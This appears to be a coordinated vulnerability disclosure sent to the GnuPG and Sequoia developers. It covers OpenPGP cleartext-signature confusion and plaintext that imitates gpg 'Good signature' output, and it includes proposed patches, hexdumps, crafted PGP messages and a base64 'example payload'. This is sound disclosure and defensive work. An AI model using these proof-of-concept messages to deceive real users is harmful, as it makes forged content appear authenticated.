 DZZc0XgsFrI+UlCh/uDUT48oUKgbjs1bYRK6FS8ZHCYEe0+UfWBII6Tg9DIQpglbFd4pLW7Zmq9P
 bLxotnoH1zgwljBBCC48vPoNVmeIxN2sbJdpyRdBnNUSW0LlTI8V+Z+Z2dsVggyQvLGZIzJ/N61x
 caowQPLaciQypBWLyiUgf4XxZtE+9NOE8hJ9zERejXbP7sS3RfmtlWlAT3maD6sg7U0+yIvNtLUG
 3UigRcxcy8PdOYawEMWWohb79SS4+acLDPdBTr8pJ89YGw0nX3QFxOSktmIaZ7FejP0/YeZVpg5Z
 K1XejPnjkgMUxvkaSPJqW6+W32YRyX/M8rnUgHOlU7359LZuNaUdkwN99OrP7nPNRoPv2YCXeZtv
 KMTO92Pzr8XMWRGc95GV9U5Mr0UVdO3f+zRXJxS3B4QZfweYfnfL2JbyILPQy0helQRhBE0wvmhx
 dZ8nnpP8OZBiYt7oEgHgOnBJ9ZfxUX9/AEkH5dgUGrAMMMF2Egg9GI7WOMdPTlZv53bRJWxIATo7
 3r3THZBvVxCGYgh67oG6A2ozJl+CMgt4LIrsO68owkWy3f4gbpr7vyANg4+erz4AA5OMQ/XmPFcn
 lWXoGaWB3w4FFzooLFvlPNpptHF0soqV/JKtQrEwMIUIl8VPnXkVNgrbkO6RlYHZLBLlhYJlXouG
 dVbvDDUGlGRghUrrZPIlMSd21ndx7SflD0D4VotEtNNjGYx2v/900fFz0IdT9shxBthBDKlDy84c
 s4ogH1ZzBcZuhKeibO5e9fZYLroIDRv4pyuzO1pwos/AZlpwg01dwxWp06wqsb65P+HFbLxN+nI3
 TnntkhJg2ay1R35Ywh0hG9bd2z0OUGGI6Z3gvn5nrFNiS8n4hdzdocXT7p5VoXHGCdrzQzv1y/Wu
 5yBFvE5WBqsUmwbzgboRaTJEAziXNu+PfFNWIYhuORVAQNjBJaqyW0QkPDEzuKGA7RZwMGs5vs5g
 FJCRZsh2UVa5WnKbRMdGQjWPQ1JXW+fHV0Lyo6NTgqL9ecRiqAAAAPgyEHPOYVHPAAH3M4CUAwD+
 yi0RscRn+wIAAAAABFla

   --------------------------------------------------------------------------

   Disclosure Timeline:

     * 21.10.2025: Submission of initial version of this report.

   Upcoming Timeline:

     * 24.10.2025: Submission of a talk for 39th Chaos Communication Congress
       (39C3). No technical details shared.
     * 21.12.2025: Disclosure of this report on
       https://seclists.org/fulldisclosure/
     * 26-31.12.2025: If accepted by content team, 39C3 Congress talk
       regarding this report

   Please note: While we might be able to offer some flexibility, our plan is
   to adhere to the above stated upcoming timeline, regardless of the
   availability of patches or fixes.

   We kindly request allocation of a CVE number to track this issue. Please
   keep us updated regarding your remediation efforts.

   Thank you

   Best, Liam

   --------------------------------------------------------------------------

                              Recommended patches

   Shared:

    1. Phasing out cleartext signatures completely is suggested. This
       requires a new OpenPGP standard version, and a deprecation period. Not
       possible until disclosure deadline

   For GPG: 2. Only verify cleartext signatures if an explicit cleartext
   verification option is provided. Prevents confusion of signature format.
   Verification could fail if an expected cleartext signature is malformed.
   3. Always output the data that was actually verified, at least for
   Cleartext signatures and One-Pass signatures. Might be problematic because
   of binary output and output limits.

    1. Alternatively, output a warning if output option is not used.

   For Sequoia: 2. Only verify the signature type as specified in command
   line. User asks for cleartext -> give them cleartext or nothing.

GPG Option 2

   Introduce a new command for verification of cleartext signatures. Accept
   cleartext signatures only if this command was used. In case no command is
   provided, the verified data is implicitly printed. Cleartext signatures
   can be accepted in this case because tampering should be visible in the
   output. Optionally, signature type detection could include cleartext
   signatures if an output option was specified.

   Separating cleartext signatures into a separate command for verification
   makes deprecating of this message type easier.

GPG Option 3

   A default output file for verification can be set here. STDOUT/STDERR
   might be dangerous due to binary output, other files are likely a bad
   default. This should be paired with asking users before printing binary
   output, skipping binary output or printing as hexadecimal.

 diff --git a/g10/gpg.c b/g10/gpg.c
 index 99fe5b844..5f80c93e7 100644
 --- a/g10/gpg.c
 +++ b/g10/gpg.c
 @@ -4698,6 +4698,8 @@ main (int argc, char **argv)
         break;

        case aVerify:
 +  if (!opt.outfile)
 +    opt.outfile = "-";
         if (multifile)
           {
             if ((rc = verify_files (ctrl, argc, argv)))

GPG Option 3.1

   Inform the user once about the dangers of verifying signatures without
   checking what was verified. Does not output a warning if an output was
   explicitly defined or was activated implicitly because no command was
   given.

 diff --git a/g10/mainproc.c b/g10/mainproc.c
 index 8108a07b7..b73580f13 100644
 --- a/g10/mainproc.c
 +++ b/g10/mainproc.c
 @@ -234,6 +234,13 @@ add_signature (CTX c, PACKET *pkt)
  {
    kbnode_t node;

 +  if (!c->any.sig_seen && !c->signed_data.used
 +      && !(opt.outfp || opt.outfile || !c->sigs_only))
 +    {
 +      log_error ("WARNING: Verified data might differ from assumed input,\n");
 +      log_error ("use --output to validate actual signed data.");
 +    }
 +
    c->any.sig_seen = 1;
    if (pkt->pkttype == PKT_SIGNATURE && !c->list)
      {

Sequoia Verification Recommendations

   Documentation, CLI and man page document separate verification options.
   However, the (inline) message verification and cleartext verification are
   passed to the same handler internally.

   There should be separate builders and verifiers for both types as this
   behaviour is security relevant. Also, it is what users would expect from
   the man page. Only the documentation declares that sequoia tries to verify
   despity the type provided by the user.

References

   Visible links
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages
   . https://www.rfc-editor.org/rfc/rfc9580.html#section-7
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s
   . https://www.gnupg.org/documentation/manuals/gnupg/Operational-GPG-Commands.html#:~:text=It%20is%20suggested%20to%20avoid%20cleartext%20signatures%20in%20favor%20of%20detached%20signatures.
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-cleartext-signature-framewo
   . https://www.rfc-editor.org/rfc/rfc9580.html
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-one-pass-signature-packet-t
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-literal-data-packet-type-id
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-signature-packet-type-id-2
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-signature-packet-type-id-2
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-cleartext-signature-framewo
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-one-pass-signature-packet-t
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-literal-data-packet-type-id
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-signature-packet-type-id-2
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-armor-header-line
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-armor-header-line
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-cleartext-signature-framewo
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-armor-header-line
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-cleartext-signature-framewo
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-openpgp-messages
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-cleartext-signature-framewo
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s
   . https://seclists.org/fulldisclosure/

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="09-noverify.txt"
Content-Transfer-Encoding: 8bit

 GnuPG Output Fails To Distinguish Signature Verification Success From Message
                                    Content

   An implementation flaw in how GnuPG handles encrypted messages allows an
   attacker to append arbitrary plaintext that looks like GnuPG log output.
   Because verification cannot occur without decryption, users cannot easily
   tell whether an encrypted message was signed or not.

Impact

   Users cannot reliably verify the authenticity of encrypted messages
   without decrypting them to plaintext. This makes it possible for attackers
   to create deceptive messages that appear valid even when unsigned.

Details

   Verifying the signatures fails in both cases

 $ gpg --verify a
 gpg: verify signatures failed: Unexpected error

 $ gpg --verify b
 gpg: verify signatures failed: Unexpected error

   Decrypting them, however, reveals plaintext output and valid signature
   information:

 $ gpg --decrypt a
 gpg: AES256.CFB encrypted data
 gpg: encrypted with 1 passphrase
 abc
 gpg: Signature made Thu 28 Aug 2025 02:40:32 PM CEST
 gpg:                using RSA key AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 gpg: Good signature from "AAAAAAAA <[email protected]>" [ultimate]

 $ gpg --decrypt b
 gpg: AES256.CFB encrypted data
 gpg: encrypted with 1 passphrase
 abc
 gpg: Signature made Thu 28 Aug 2025 02:40:32 PM CEST
 gpg:                using RSA key AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 gpg: Good signature from "AAAAAAAA <[email protected]>" [ultimate]

   In both cases, GnuPG reports a valid signature, but only after
   decryption—preventing safe pre-verification of message authenticity.

Scenario

   Bob expects a signed and encrypted message from Alice. Mallory, an active
   MITM lacking Alice’s keys, crafts a fake encrypted message containing
   arbitrary data that mimics GnuPG’s output format.

   When Bob runs gpg --verify, the verification fails.
   When he tries gpg --decrypt, it succeeds and prints a “Good signature”
   message—despite the appended plaintext being maliciously crafted. Bob,
   seeing a successful decryption and valid-looking signature message,
   assumes authenticity.

Procedure

   Both --verify and --decrypt commands exit with code 0.
   One message includes a genuine signature, the other forges GnuPG-style
   “gpg:” lines in the plaintext.

  Legitimate plaintext

 $ gpg --decrypt a | hexdump -C
 gpg: AES256.CFB encrypted data
 gpg: encrypted with 1 passphrase
 gpg: Signature made Thu 28 Aug 2025 02:40:32 PM CEST
 gpg:                using RSA key AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 gpg: Good signature from "AAAAAAAA <[email protected]>" [ultimate]
 00000000  61 62 63 0a                                       |abc.|
 00000004

  Appended Plaintext

 $ gpg --decrypt b | hexdump -C
 gpg: AES256.CFB encrypted data
 gpg: encrypted with 1 passphrase
 00000000  61 62 63 0a 67 70 67 3a  20 53 69 67 6e 61 74 75  |abc.gpg: Signatu|
 00000010  72 65 20 6d 61 64 65 20  54 68 75 20 32 38 20 41  |re made Thu 28 A|
 00000020  75 67 20 32 30 32 35 20  30 32 3a 34 30 3a 33 32  |ug 2025 02:40:32|
 00000030  20 50 4d 20 43 45 53 54  0a 67 70 67 3a 20 20 20  | PM CEST.gpg:   |
 00000040  20 20 20 20 20 20 20 20  20 20 20 20 20 75 73 69  |             usi|
 00000050  6e 67 20 52 53 41 20 6b  65 79 20 41 41 41 41 41  |ng RSA key AAAAA|
 00000060  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
 00000070  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
 00000080  41 41 41 0a 67 70 67 3a  20 47 6f 6f 64 20 73 69  |AAA.gpg: Good si|
 00000090  67 6e 61 74 75 72 65 20  66 72 6f 6d 20 22 41 41  |gnature from "AA|
 000000a0  41 41 41 41 41 41 20 3c  41 41 41 41 40 41 41 41  |AAAAAA <AAAA@AAA|
 000000b0  41 41 2e 63 6f 6d 3e 22  20 5b 75 6c 74 69 6d 61  |AA.com>" [ultima|
 000000c0  74 65 5d 0a 00 00 00 00  00 00 00 00 00 00 00 00  |te].............|
 000000d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
 *
 00000250  00 00 00 00                                       |....|
 00000254

Recommendations

    1. Users of GnuPG should only trust program log output on stderr, and
       interpret stdout as message content, and explicitly separate them in
       order to avoid confusion.
    2. GnuPG should support an option to verify the presence and validity of
       a signature without decrypting to an output file or standard output.
    3. GnuPG should output a warning when --decrypt did not verify any
       signatures.

   --------------------------------------------------------------------------

   Finder credits: 49016

   Disclosure Timeline:

     * 22.10.2025: Submission of initial version of this report.

   Upcoming Timeline:

     * 24.10.2025: Submission of a talk for 39th Chaos Communication Congress
       (39C3). No technical details shared.
     * 21.12.2025: Disclosure of this report on
       https://seclists.org/fulldisclosure/
     * 26-31.12.2025: If accepted by content team, 39C3 Congress talk
       regarding this report

   Please note: While we might be able to offer some flexibility, our plan is
   to adhere to the above stated upcoming timeline, regardless of the
   availability of patches or fixes. Please keep us updated regarding your
   remediation efforts.

   Thank you

   Best, Liam

                              Incoherent Rambling

   sq:

 ==> a <==
 -----BEGIN PGP MESSAGE-----

 jA0ECQMKZOBdA934tTX+0ukB/ujuiwIdJnma3N+HyGlSBFCfK3oACL6ESVSaMByN
 wGGZcrFWe4lSHZcVFJKixblJK1K/jg2zzk11QUHzSlzAS2dqxp5OaB+2zENzjktN
 flC0DBXhHyUp2aQJKiA6waruqPvIQNLKjxAGbkiaNUF70NDzerEn79Ag5pUaH+GR
 /HynT1XMQsD07C01HasYaKmIMyG77UN0zeO+EAowEv874GuspE9GQJF7SGdoullj
 UsZcmTSHzLXmfDrqdGANe8D/07KZtpRgnmLrMVD2DsAZWyMVaKrYKkAEWrOlNK/b
 19ZnQwOQK3dKOGRJaujERIl2JsBD2MCWQ6O8QcxklfLY4IyFkEzb8O+E7Zor044p
 o5D6Io8zk8q/T3639Gq8hqq5BO5A2G0x3mAO4JjNZ8QzmiUU294mPNiV3VBgR9VC
 k99k8zqrMOVkvUqbjQyT5LpR0LqZldKDsPPFOBF8cF4KleJsWorvnYXdEz+hvPoK
 xCtiumH0lZSyXIhwXnontfNa6GCCy+Nw0KtGMyMqT+aoodV7cCS+WsdZuy97vqS4
 +C9LiIHla0c+kWW5dQRD8hnC01Ty7KZX+17V13ZSudpsTEtYYkztltXRUvuQNC4H
 hD09MppwfmfHwZ6LD+ZOQeynBfp2a99w9KFzM7PqWK0mRFSuGwm/NaezD0Wft/WE
 iIHrAzPxoId0nulrnKzfl9IGKV+2HKOdlvhVYS2HV3GYZi7fJT8/DC1QHzuKuXFi
 zs3Arg+LzrRRKnurmWD2Nr213weOpmGFHRkkQRP9TRt9n3u/s7RVYsgMHKCxKwKF
 PyvtyO4B6J/66Bihq+tCkp2s4PB+agxDvPoXnC/sa159nc4=
 =7Pq0
 -----END PGP MESSAGE-----
 ==> b <==
 -----BEGIN PGP MESSAGE-----

 jA0ECQMK+oXIwFtNZvv+0ukBomNWnXD9KSiJZe64IDUz+OYEf4qaX/WzDla6x5gb
 hzY1nh5tUzrVcVT0rpXHD0EI9eRsLFdyG7Cvdv9tSj/WVCCBQ7J+kRN0iEchCkgF
 gPjLCnvz09VlSbpDtzyL976NjRMk8H+G7hKUtPuk4HXZhL9QZSsufSyfkW4uMeRx
 BaxxHD2M5CKTxIfDCZR8w1S3/eMQUnHoXTRcgtQiJJBd2o169WGoMgDbFbdfYeDw
 UE/gFpu2e0zEoMuVRbKOhd9ih7sZFtWE9AvkJCmO4p5pHGuIYbJNMWqBbPpSgO8Q
 /3QuXY2yIYgcamBsCfrBGC9+iAC35NRizZqf27itxxPjHoL7lA05FHyeRuOtWz/W
 2KlygdcTLXt2iT+2n1rJ+/GqmzZCT7vfml+3KwUB47t/3trkhxAitu2Fsbpb/uhj
 rqgE9yaEvZbLQnDDpNfAbxAZ69+Wro524D1G/tk18v9cNv4b0Xp1+DI9h40vAEWZ
 XLloCeFRTJ9HsAlNXCIgSvb3tEB55wqqX3pVZ2NKDGToBZ48n4FYw+7/2HiTfkdh
 eKgxODXShCjxC2lO75zoSfzOBuY1PQzgOmXB48JY18lQsTrzz6fQV6gZPntHcZeI
 3kWOwyHCHZV879fXkvyEJKOgp9S+nYFz4hUfO49kNeMsakPnUCJCEnZaNjhXtoqX
 W6aOMVzFQc+G1edySoZzCVV7fvuIV0mpyCXT8G9LoBeegi6DqY2EPLq2VJ0J6IjG
 TB1+Qum7JR4e74oTTYFxJqEHVLmziq7Ouaow5XNz5i8a3vsKALPGYW8mt9/VGjPI
 KRnnO4AzwAHrhvK9OEqE6zvxyTRRSVj1M9cri+yN5cQo4bo8AxMY7jqa7+q8m3cn
 GFwa79KoeSZaEawXTieMo+e1LMQ1S7h/
 =gmHK
 -----END PGP MESSAGE-----

Impact

   A normal user cannot easily verify if an encrypted message has been
   verified correctly

 $ gpg --verify a
 gpg: verify signatures failed: Unexpected error

 $ gpg --verify b
 gpg: verify signatures failed: Unexpected error

 $ gpg --decrypt a
 gpg: AES256.CFB encrypted data
 gpg: encrypted with 1 passphrase
 abc
 gpg: Signature made Thu 28 Aug 2025 02:40:32 PM CEST
 gpg:                using RSA key D063593DBA72EA735B2344B7B23ADC47086BEFBA
 gpg: Good signature from "signer" [ultimate]

 $ gpg --decrypt b
 gpg: AES256.CFB encrypted data
 gpg: encrypted with 1 passphrase
 abc
 gpg: Signature made Thu 28 Aug 2025 02:40:32 PM CEST
 gpg:                using RSA key D063593DBA72EA735B2344B7B23ADC47086BEFBA
 gpg: Good signature from "signer" [ultimate]

   Both exit with exit status 0. One of them has a signature, the other has
   “gpg: ” lines in the plaintext. (are we deadass??)

   example payload as .tar.b64:

 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
